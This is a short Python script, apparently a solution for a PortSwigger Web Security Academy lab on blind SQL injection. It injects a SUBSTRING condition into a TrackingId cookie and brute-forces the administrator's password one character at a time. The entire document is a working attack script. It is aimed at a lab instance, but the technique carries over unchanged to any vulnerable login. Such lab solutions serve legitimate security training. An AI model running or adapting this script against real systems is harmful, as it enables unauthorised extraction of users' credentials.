#! /bin/python3

# Made for PortSwigger SQLi Lab (BSQLi on MySQL w/ Conditional Responses)

import requests
from requests.structures import CaseInsensitiveDict

# Configurations

url = "https://0a1e0016043a6ef0c019377000bc0069.web-security-academy.net/login"

char_space = 'abcdefghijklmnopqrstuvwxyz01234567890'

expected_data_length = 20

filter_string = "Welcome Back"

table_name = "users"
column_name = "password"
filter_column_name = "username"
filter_column_data = "administrator"

extracted_data = ""

print("\n[!] Attack in Progress...\n")

# Data Extrapolation

for position in range(1, expected_data_length):

	for char in char_space:

		injection_string = f"' AND SUBSTRING((SELECT {column_name} FROM {table_name} WHERE {filter_column_name} = '{filter_column_data}'), {position}, 1) = '{char}'-- "

		# Injection Vector
		
		headers = CaseInsensitiveDict()
		headers["Cookie"] = f"TrackingId=efbYMRNNA5hW91s7{injection_string}; session=QMPzWwwEPHKO2bowwjv6rhI8LAjuhAjd"

		resp = requests.get(url, headers=headers)

		if filter_string in resp.text:
		
			print("[+] Character #" + str(position) + " found!")
			extracted_data = extracted_data + char
			break
		
		else:
			pass

print("\n[!] Data Extracted: " + extracted_data)
